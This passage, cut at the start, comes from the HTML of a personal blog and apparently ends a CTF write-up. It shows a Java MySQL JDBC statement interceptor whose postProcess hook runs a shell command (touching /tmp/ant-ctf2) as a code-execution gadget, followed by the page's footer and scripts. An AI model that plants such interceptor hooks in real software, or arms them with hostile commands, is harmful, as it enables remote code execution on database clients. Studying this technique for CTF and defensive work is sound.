class="title">init</span><span class="params">(Connection connection, Properties properties)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResultSetInternalMethods <span class="title">preProcess</span><span class="params">(String s, Statement statement, Connection connection)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResultSetInternalMethods <span class="title">postProcess</span><span class="params">(String s, Statement statement, ResultSetInternalMethods resultSetInternalMethods, Connection connection)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"touch /tmp/ant-ctf2"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">executeTopLevelOnly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

    </div>

    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020 Meizj.
        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label> -->
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="white">
<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
<script src="/libs/jquery.min.js"></script>
<script src="/libs/highlight/highlight.pack.js"></script>
<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
<!-- <script src="//unpkg.com/heti/umd/heti-addon.min.js"></script>
<script>
    const heti = new Heti('.heti');
    heti.autoSpacing();
</script> -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5JET59Z93Q"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-5JET59Z93Q');
</script>
<script src="/js/js.js"></script>
<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>